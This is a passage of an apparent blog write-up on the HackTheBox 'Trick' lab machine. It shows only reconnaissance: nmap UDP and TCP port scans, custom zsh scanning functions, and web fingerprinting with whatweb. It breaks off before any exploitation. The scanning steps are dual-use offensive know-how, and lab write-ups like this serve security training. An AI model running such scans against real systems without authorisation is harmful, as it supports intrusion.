<!DOCTYPE html> <html lang="es"><head>
<title>Machine Trick</title>
<base href=".">
<script src="https://kmn9.github.io/theopendoor/site-lib/scripts/copy-commands.js"></script>
<meta name="pathname" content="machine-trick.html">
<meta name="description" content="Blog - Machine Trick">
<meta property="og:title" content="Machine Trick">
<meta property="og:description" content="Blog - Machine Trick">
<meta property="og:type" content="website">
<meta property="og:url" content="machine-trick.html">
<meta property="og:image" content="img/pasted-image-20251110185756.png">
<meta charset="UTF-8"><meta property="og:site_name" content="Blog"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, minimum-scale=1.0, maximum-scale=5.0"><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="site-lib/rss.xml"><script async="" id="webpage-script" src="site-lib/scripts/webpage.js" onload="this.onload=null;this.setAttribute(&quot;loaded&quot;, &quot;true&quot;)"></script><link rel="icon" href="site-lib/media/favicon.png"><link rel="stylesheet" href="site-lib/styles/obsidian.css"><link rel="stylesheet" href="site-lib/styles/theme.css"><link rel="preload" href="site-lib/styles/global-variable-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/global-variable-styles.css"></noscript><link rel="preload" href="site-lib/styles/main-styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><noscript><link rel="stylesheet" href="site-lib/styles/main-styles.css"></noscript><style>body{--line-width:40em;--line-width-adaptive:40em;--file-line-width:40em;--sidebar-width:min(20em, 80vw);--collapse-arrow-size:11px;--tree-vertical-spacing:1.3em;--sidebar-margin:12px}:root{background-color:#202124}.sidebar{height:100%;font-size:14px;z-index:10;min-width:calc(var(--sidebar-width) + var(--divider-width-hover));max-width:calc(var(--sidebar-width) + var(--divider-width-hover));position:relative;overflow:hidden;overflow:clip;transition:min-width ease-in-out,max-width ease-in-out;transition-duration:.2s;contain:size}#left-sidebar{left:0}#right-sidebar{right:0}.sidebar.is-collapsed{min-width:0;max-width:0}.sidebar.floating{position:absolute}.sidebar .leaf-content{height:100%;min-width:calc(var(--sidebar-width) - var(--divider-width-hover));top:0;padding:var(--sidebar-margin);padding-top:4em;line-height:var(--line-height-tight);background-color:var(--background-secondary);transition:background-color,border-right,border-left,box-shadow;transition-duration:var(--color-fade-speed);transition-timing-function:ease-in-out;position:absolute;display:flex;flex-direction:column}.sidebar:not(.is-collapsed) .leaf-content{min-width:calc(max(100%,var(--sidebar-width)) - 3px);max-width:calc(max(100%,var(--sidebar-width)) - 3px)}#left-sidebar-content{left:0;border-top-right-radius:var(--radius-l);border-bottom-right-radius:var(--radius-l)}#right-sidebar-content{right:0;border-top-left-radius:var(--radius-l);border-bottom-left-radius:var(--radius-l)}.sidebar #left-sidebar-content,.sidebar #right-sidebar-content{contain:none!important;container-type:normal!important;animation:none!important}.sidebar:has(.leaf-content:empty):has(.topbar-content:empty){display:none}.sidebar-topbar{height:calc(2.3em + 2 * var(--sidebar-margin));width:var(--sidebar-width);padding:var(--sidebar-margin);z-index:1;position:fixed;display:flex;align-items:center;transition:width ease-in-out;transition-duration:inherit}.sidebar.is-collapsed .sidebar-topbar{width:calc(2.3em + var(--sidebar-margin) * 2)}.sidebar .sidebar-topbar.is-collapsed{width:0}#left-sidebar .sidebar-topbar{left:0;flex-direction:row;border-top-right-radius:var(--radius-l)}#right-sidebar .sidebar-topbar{right:0;flex-direction:row-reverse;border-top-left-radius:var(--radius-l)}#left-sidebar .topbar-content{margin-right:calc(2.3em + var(--sidebar-margin));flex-direction:row}#right-sidebar .topbar-content{margin-left:calc(2.3em + var(--sidebar-margin));flex-direction:row-reverse}.topbar-content{overflow:hidden visible;overflow:clip visible;width:100%;height:100%;display:flex;align-items:center;transition:inherit}.sidebar.is-collapsed .topbar-content{width:0;transition:inherit}.clickable-icon.sidebar-collapse-icon{background-color:transparent;color:var(--icon-color-focused);padding:2px!important;margin:0!important;height:100%!important;width:2.3em!important;margin-inline:0.14em!important;position:absolute}#left-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);right:var(--sidebar-margin)}#right-sidebar .clickable-icon.sidebar-collapse-icon{transform:rotateY(180deg);left:var(--sidebar-margin)}.clickable-icon.sidebar-collapse-icon svg.svg-icon{width:100%;height:100%}.feature-title{margin-left:1px;text-transform:uppercase;letter-spacing:.06em;margin-top:.75em;margin-bottom:.75em}.feature-header{display:flex;align-items:center;padding-top:0;font-size:1em;padding-left:0}body.floating-sidebars .sidebar{position:absolute}body{transition:background-color var(--color-fade-speed) ease-in-out}#navbar:not(:empty){display:flex;align-items:center;justify-content:space-between;padding:.5em 1em;width:100%}#main{display:flex;flex-direction:column;height:100%;width:100%;align-items:stretch;justify-content:center}#main-horizontal{display:flex;flex-direction:row;flex-grow:1;width:100%;align-items:stretch;justify-content:center}#center-content{flex-basis:100%;max-width:100%;width:100%;height:100%;display:flex;flex-direction:column;align-items:center;transition:opacity .2s ease-in-out;contain:inline-size}.hide{opacity:0!important;transition:opacity .2s ease-in-out;pointer-events:none}#center-content>.obsidian-document{padding-left:2em;padding-right:1em;margin-bottom:0;width:100%;width:-webkit-fill-available;width:-moz-available;width:fill-available;transition:background-color var(--color-fade-speed) ease-in-out;border-top-right-radius:var(--window-radius,var(--radius-m));border-top-left-radius:var(--window-radius,var(--radius-m));overflow-x:hidden!important;overflow-y:auto!important;display:flex!important;flex-direction:column!important;align-items:center!important;contain:inline-size}body #center-content>.obsidian-document>.markdown-preview-sizer{padding-bottom:80vh;width:100%;max-width:var(--line-width);flex-basis:var(--line-width);transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document>div{width:100%!important;transition:background-color var(--color-fade-speed) ease-in-out;contain:inline-size}#center-content>.obsidian-document:not([data-type=markdown]).embed{display:flex;padding:1em;height:100%;width:100%;align-items:center;justify-content:center}#center-content>.obsidian-document:not([data-type=markdown]).embed>*{max-width:100%;max-height:100%;object-fit:contain}:not(h1,h2,h3,h4,h5,h6,li):has(> :is(.math,table)){overflow-x:auto!important}#center-content>.obsidian-document:not([data-type=markdown]){overflow-x:auto;contain:content;padding:0;margin:0;height:100%}.obsidian-document[data-type=attachment]{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100%;width:100%}.obsidian-document[data-type=attachment]>*{outline:0;border:none;box-shadow:none}.obsidian-document[data-type=attachment] :is(img){max-width:90%;max-height:90%;object-fit:contain}.obsidian-document[data-type=attachment]>:is(audio){width:100%;max-width:min(90%,var(--line-width))}.obsidian-document[data-type=attachment]>:is(embed,iframe,video){width:100%;height:100%;max-width:100%;max-height:100%;object-fit:contain}.canvas-wrapper>:is(.header,.footer){z-index:100;position:absolute;display:flex;justify-content:center;flex-direction:column;width:100%;align-items:center}.scroll-highlight{position:absolute;width:100%;height:100%;pointer-events:none;z-index:1000;background-color:hsla(var(--color-accent-hsl),.25);opacity:0;padding:1em;inset:50%;translate:-50% -50%;border-radius:var(--radius-s)}</style><script defer="">async function loadIncludes(){let e=document.querySelectorAll("link[itemprop='include']");for(const t of e){let e=t.getAttribute("href");try{let o="";if(e.startsWith("https:")||e.startsWith("http:")||"file:"!=window.location.protocol){const n=await fetch(e);if(!n.ok){console.log("Could not include file: "+e),t?.remove();continue}o=await n.text()}else{const t=document.getElementById(btoa(encodeURI(e)));if(t){const e=JSON.parse(decodeURI(atob(t.getAttribute("value")??"")));o=e?.data??""}}let n=document.createRange().createContextualFragment(o);t.before(n),t.remove(),console.log("Included text: "+o),console.log("Included file: "+e)}catch(o){t?.remove(),console.log("Could not include file: "+e,o);continue}}}document.addEventListener("DOMContentLoaded",(()=>{loadIncludes()}));let isFileProtocol="file:"==location.protocol;function waitLoadScripts(e,t){let o=e.map((e=>document.getElementById(e+"-script")));!function e(n){let l=o[n],c=n+1;l?(l&&"true"!=l.getAttribute("loaded")||n<o.length&&e(c),n<o.length&&l.addEventListener("load",(()=>e(c)))):n<o.length?e(c):t()}(0)}</script></head><a href="https://kmn9.github.io/theopendoor/index.html" style="position:fixed;top:10px;left:10px;z-index:9999;background:rgba(30,30,30,0.8);backdrop-filter:blur(6px);color:#fff;padding:8px 14px;border-radius:50px;text-decoration:none;font-family:'Inter',sans-serif;font-size:14px;line-height:1;box-shadow:0 4px 12px rgba(0,0,0,0.25);transition:all 0.3s ease;cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:6px;" onmouseover="this.style.background='rgba(60,60,60,0.85)';" onmouseout="this.style.background='rgba(30,30,30,0.8)';" onclick="this.blur();" >‚Üê<span style='display:none;@media(min-width:600px){display:inline;}'> Back to main page</span></a><body class="publish css-settings-manager styled-scrollbars show-inline-title show-ribbon is-focused"><script defer="">let theme=localStorage.getItem("theme")||(window.matchMedia("(prefers-color-scheme: dark)").matches?"dark":"light");"dark"==theme?(document.body.classList.add("theme-dark"),document.body.classList.remove("theme-light")):(document.body.classList.add("theme-light"),document.body.classList.remove("theme-dark")),window.innerWidth<480?document.body.classList.add("is-phone"):window.innerWidth<768?document.body.classList.add("is-tablet"):window.innerWidth<1024?document.body.classList.add("is-small-screen"):document.body.classList.add("is-large-screen")</script><div class="parsed-feature-container" style="display: contents;"><link itemprop="include" href="site-lib/html/custom-head-content-content.html"></div><div id="main"><div id="navbar"></div><div id="main-horizontal"><div id="left-content" class="leaf" style="--sidebar-width: var(--sidebar-width-left);"><div id="left-sidebar" class="sidebar"><div class="sidebar-handle"></div><div class="sidebar-topbar"><div class="topbar-content"></div><div class="clickable-icon sidebar-collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" class="svg-icon"><path d="M21 3H3C1.89543 3 1 3.89543 1 5V19C1 20.1046 1.89543 21 3 21H21C22.1046 21 23 20.1046 23 19V5C23 3.89543 22.1046 3 21 3Z"></path><path d="M10 4V20"></path><path d="M4 7H7"></path><path d="M4 10H7"></path><path d="M4 13H7"></path></svg></div></div><div class="sidebar-content-wrapper"><div id="left-sidebar-content" class="leaf-content"></div></div><script defer="">let ls = document.querySelector("#left-sidebar"); ls.classList.toggle("is-collapsed", window.innerWidth < 768); ls.style.setProperty("--sidebar-width", localStorage.getItem("sidebar-left-width"));</script></div></div><div id="center-content" class="leaf"><div class="obsidian-document markdown-preview-view markdown-rendered node-insert-event is-readable-line-width allow-fold-headings allow-fold-lists show-indentation-guide show-properties" data-type="markdown"><style id="MJX-CHTML-styles"></style><div class="markdown-preview-sizer markdown-preview-section"><div class="header"><h1 class="page-title heading inline-title" id="Machine_Trick_0">Machine Trick</h1><div class="data-bar"></div></div><div class="markdown-preview-pusher" style="width: 1px; height: 0.1px; margin-bottom: 0px;"></div><div class="el-hr"><hr></div><div class="el-p"><p dir="auto">Tags: <a href="?query=tag:machine" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#machine">#machine</a> <a href="?query=tag:htb" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#htb">#htb</a> <a href="?query=tag:easy" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#easy">#easy</a> <a href="?query=tag:linux" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#linux">#linux</a> <a href="?query=tag:lfi" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#lfi">#lfi</a> <a href="?query=tag:pathtraversal" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#pathtraversal">#pathtraversal</a> <a href="?query=tag:lfi_bypass" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#lfi_bypass">#lfi_bypass</a> <a href="?query=tag:lfi_to_rce" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#lfi_to_rce">#lfi_to_rce</a> <a href="?query=tag:log_poisoning" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#log_poisoning">#log_poisoning</a> <a href="?query=tag:sqliboolean" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#sqliboolean">#sqliboolean</a> <a href="?query=tag:sqli" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#sqli">#sqli</a> <a href="?query=tag:python_scripting" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#python_scripting">#python_scripting</a> <a href="?query=tag:bash_scripting" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#bash_scripting">#bash_scripting</a> <a href="?query=tag:privilege_escalation" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#privilege_escalation">#privilege_escalation</a> <a href="?query=tag:abuse_fail2ban_sudoers" class="tag is-unresolved" target="_self" rel="noopener nofollow" data-href="#abuse_fail2ban_sudoers">#abuse_fail2ban_sudoers</a></p></div><div class="el-hr"><hr></div><div class="el-h1"><h1 data-heading="Information Gathering" dir="auto" class="heading" id="Information_Gathering_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Information Gathering</h1></div><div class="el-h2"><h2 data-heading="Discovering OS via TTL Using `ping`" dir="auto" class="heading" id="Discovering_OS_via_TTL_Using_`ping`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering OS via TTL Using <code>ping</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function">ping</span> <span class="token parameter variable">-c</span> <span class="token number">1</span> <span class="token number">10.10</span>.11.166
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110185756.png" src="img/pasted-image-20251110185756.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110185756.png" src="img/pasted-image-20251110185756.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">Based on the TTL values obtained from the <code>ping</code> command, the operating system of the victim machine was identified as <code>Linux</code>. Typically, a TTL value below <code>64</code> corresponds to <code>Linux</code> systems, whereas a TTL between <code>65</code> and <code>128</code> indicates a <code>Windows</code> system. Next, a <code>UDP</code> port scan will be performed.</p></div><div class="el-h2"><h2 data-heading="UDP Port Scan Using `nmap`" dir="auto" class="heading" id="UDP_Port_Scan_Using_`nmap`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>UDP Port Scan Using <code>nmap</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">nmap <span class="token parameter variable">-sU</span> --min-rate <span class="token number">5000</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> --top-ports <span class="token number">100</span> <span class="token number">10.10</span>.11.166 <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-v</span> <span class="token string">'no-response'</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110185819.png" src="img/pasted-image-20251110185819.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110185819.png" src="img/pasted-image-20251110185819.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">The scan reported port <code>53 (DNS)</code> as open, so it will be enumerated after performing another scan to discover open <code>TCP</code> ports.</p></div><div class="el-h2"><h2 data-heading="TCP Port Scan Using a Custom `.zshrc` Function (`jmap`)" dir="auto" class="heading" id="TCP_Port_Scan_Using_a_Custom_`.zshrc`_Function_(`jmap`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port Scan Using a Custom <code>.zshrc</code> Function (<code>jmap</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110185912.png" src="img/pasted-image-20251110185912.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110185912.png" src="img/pasted-image-20251110185912.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>[+] Introduce una IP<span class="token entity" title="\n">\n</span>"</span>
        <span class="token builtin class-name">read</span> <span class="token function">ip</span>
        <span class="token builtin class-name">echo</span>
        <span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-n</span> <span class="token parameter variable">-Pn</span> -p- --min-rate <span class="token number">5000</span> <span class="token parameter variable">-vvv</span> <span class="token parameter variable">--open</span> <span class="token variable">$ip</span> <span class="token parameter variable">-oG</span> scan
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">Using a custom function named <code>jmap</code>, previously defined in <code>.zshrc</code>, a TCP scan was conducted, revealing that ports <code>22 (SSH)</code>, <code>25 (SMTP)</code>, <code>53 (DNS)</code>, and <code>80 (HTTP)</code> were open, providing valuable context about the target machine. Following this discovery, a more detailed scan will be performed against the identified ports:</p></div><div class="el-h2"><h2 data-heading="Represent Scan Information Legibly Using  a `.zshrc` Custom Function (`extractPorts`)" dir="auto" class="heading" id="Represent_Scan_Information_Legibly_Using_a_`.zshrc`_Custom_Function_(`extractPorts`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Represent Scan Information Legibly Using  a <code>.zshrc</code> Custom Function (<code>extractPorts</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">extractPorts scan
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110185929.png" src="img/pasted-image-20251110185929.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110185929.png" src="img/pasted-image-20251110185929.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">extractPorts</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Extracting information..."</span>
        
        <span class="token assign-left variable">ip_address</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'Host: \K\S+'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-n</span> <span class="token number">1</span><span class="token variable">)</span></span> 

        <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">grep</span> <span class="token parameter variable">-oP</span> <span class="token string">'\d+(?=/open)'</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">|</span> <span class="token function">tr</span> <span class="token string">'\n'</span> <span class="token string">','</span> <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/,$/\n/'</span><span class="token variable">)</span></span> 
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">{</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"IP Address: <span class="token variable">$ip_address</span>"</span>
                <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Open ports: <span class="token variable">$ports</span><span class="token entity" title="\n">\n</span>"</span>
        <span class="token punctuation">}</span> <span class="token operator">&gt;&gt;</span> extractPorts.tmp
        <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token operator">|</span> xclip <span class="token parameter variable">-sel</span> clip
        <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Ports copied to clipboard<span class="token entity" title="\n">\n</span>"</span>
        <span class="token function">cat</span> extractPorts.tmp
        <span class="token function">rm</span> extractPorts.tmp
<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function shown in the image <code>extractPorts</code>, also previously defined in the <code>.zshrc</code>, displays the information from the previous scan and copies the ports to the clipboard. This makes it easier to perform a second scan on the discovered ports, especially when there are many.</p></div><div class="el-h2"><h2 data-heading="Discovering Service Versions on Open TCP Ports Using a `.zshrc` Custom Function (`jmap2`)" dir="auto" class="heading" id="Discovering_Service_Versions_on_Open_TCP_Ports_Using_a_`.zshrc`_Custom_Function_(`jmap2`)_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>Discovering Service Versions on Open TCP Ports Using a <code>.zshrc</code> Custom Function (<code>jmap2</code>)</h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">jmap2
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110190036.png" src="img/pasted-image-20251110190036.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110190036.png" src="img/pasted-image-20251110190036.png" target="_self"></span></p></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded"><span class="token function-name function">jmap2</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

        <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$#</span>"</span> <span class="token parameter variable">-ne</span> <span class="token number">2</span> <span class="token punctuation">]</span>
        <span class="token keyword">then</span>
                <span class="token builtin class-name">echo</span> <span class="token string">"Uso: jmap2 &lt;ip&gt; &lt;ports&gt;"</span>
                <span class="token builtin class-name">return</span> <span class="token number">1</span>
        <span class="token keyword">fi</span>
        
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ip</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span> 
        <span class="token builtin class-name">local</span> <span class="token assign-left variable">ports</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$2</span>"</span> 
        nmap -p<span class="token string">"<span class="token variable">$ports</span>"</span> <span class="token parameter variable">-sCV</span> <span class="token string">"<span class="token variable">$ip</span>"</span>

<span class="token punctuation">}</span>
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto">The function <code>jmap2</code>, also predefined in the <code>.zshrc</code>, was used to perform a targeted scan on the previously identified ports. This scan aimed to enumerate the running services and their versions, as well as to apply basic reconnaissance scripts against those services. The results did not show any important findings, but highlighted some information: the <code>HTTP</code> server is using <code>nginx</code>, and the <code>SMTP</code> server allows the <code>VRFY</code> method, which can be used to enumerate system users. Following this, the technologies and services running on the web service will be enumerated:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Identifying Technologies and Services on the Web Service Using `whatweb` &amp; `wappalyzer`" dir="auto" class="heading" id="TCP_Port_80_Identifying_Technologies_and_Services_on_the_Web_Service_Using_`whatweb`_&amp;_`wappalyzer`_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Identifying Technologies and Services on the Web Service Using <code>whatweb</code> &amp; <code>wappalyzer</code></h2></div><div class="el-pre"><pre class="language-bash"><code data-line="0" class="language-bash is-loaded">whatweb http://10.10.11.166
</code><button class="copy-code-button"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-copy"><rect x="8" y="8" width="14" height="14" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg></button></pre></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110190148.png" src="img/pasted-image-20251110190148.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110190148.png" src="img/pasted-image-20251110190148.png" target="_self"></span></p></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110190216.png" src="img/pasted-image-20251110190216.png" class="internal-embed media-embed image-embed is-loaded" target="_self"><img alt="Pasted image 20251110190216.png" src="img/pasted-image-20251110190216.png" target="_self"></span></p></div><div class="el-p"><p dir="auto">By using <code>whatweb</code> and <code>wappalyzer</code>, we were able to identify the technologies running on the specified <code>HTTP</code> services. The only information reported was the use of <code>nginx</code>. Following the web-service enumeration, the source code will be inspected:</p></div><div class="el-h2"><h2 data-heading="TCP Port 80: Source Code Inspection" dir="auto" class="heading" id="TCP_Port_80_Source_Code_Inspection_0"><span class="heading-collapse-indicator collapse-indicator collapse-icon"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon right-triangle"><path d="M3 8L12 17L21 8"></path></svg></span>TCP Port 80: Source Code Inspection</h2></div><div class="el-p"><p dir="auto"><span alt="Pasted image 20251110190305.png" 